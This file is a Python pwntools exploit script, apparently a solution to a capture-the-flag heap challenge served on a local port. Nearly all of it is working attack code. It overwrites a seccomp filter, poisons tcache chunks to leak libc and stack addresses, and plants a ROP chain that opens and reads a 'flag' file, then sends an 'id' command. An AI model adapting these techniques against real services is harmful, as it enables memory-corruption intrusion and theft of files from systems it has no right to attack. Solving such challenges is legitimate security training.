#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal



# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = '/root/input_elf'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('127.0.0.1', 60005)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/root/libc.so')



def alloc(index):
    sh.sendlineafter('choice: ', '1')
    sh.sendlineafter('Index: ', str(index))

def edit(index, size, content):
    sh.sendlineafter('choice: ', '4')
    sh.sendlineafter('Index: ', str(index))
    sh.sendlineafter('Size: ', str(size))
    sh.sendafter('Content: ', content)

def delete(index):
    sh.sendlineafter('choice: ', '3')
    sh.sendlineafter('Index: ', str(index))

def show(index):
    sh.sendlineafter('choice: ', '2')
    sh.sendlineafter('Index: ', str(index))

filter1 = ' \x00\x00\x00\x00\x00\x00\x00\x15\x00\x01\x00\x01\x01\x00\x005\x00\x01\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f'
sh.sendlineafter('choice: ', '6')
sh.sendafter('name: ', 'a' * 32 + filter1)

for i in range(5):
    alloc(i)

delete(2)
delete(1)
edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(elf.symbols['stderr']))
alloc(1)
alloc(2)
show(2)
result = sh.recvuntil('\n', drop=True)
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['_IO_2_1_stderr_']
log.success('libc_addr: ' + hex(libc_addr))

delete(3)
delete(1)
edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(libc_addr + libc.symbols['environ']))
alloc(1)
alloc(2)
show(2)
result = sh.recvuntil('\n', drop=True)
stack_addr = u64(result.ljust(8, '\0'))
log.success('stack_addr: ' + hex(stack_addr))

delete(4)
delete(1)
edit(0, 0x100, 'a' * 0x50 + p64(0) + p64(0x61) + p64(stack_addr - 0xf8))
alloc(1)
alloc(2)
layout = [
    0x0000000000401016, # ret
    0x0000000000401016, # ret
    0x0000000000401016, # ret
    0x0000000000401016, # ret

    0x00000000004018fb, # : pop rdi ; ret
    stack_addr - 0xf8 + 0x100,
    0x00000000004018f9, # : pop rsi ; pop r15 ; ret
    0,
    0,
    libc_addr + 0x00000000000439c8, # : pop rax ; ret
    2, # sys_open
    libc_addr + 0x00000000000d2975, # : syscall ; ret

    0x00000000004018fb, # : pop rdi ; ret
    3,
    0x00000000004018f9, # : pop rsi ; pop r15 ; ret
    0x404800,
    0,
    libc_addr + 0x0000000000001b96, # : pop rdx ; ret
    0x100,
    elf.plt['read'],

    0x00000000004018fb, # : pop rdi ; ret
    0x404800,
    elf.plt['puts'],

    elf.plt['exit'],
]
edit(2, 0x200, flat(layout).ljust(0x100, '\0') + 'flag\0')

sh.sendlineafter('choice: ', '5')


sleep(1)
sh.sendline("id")
sleep(1)
print sh.recv(timeout=5)
sleep(10)
sh.close
#sh.interactive()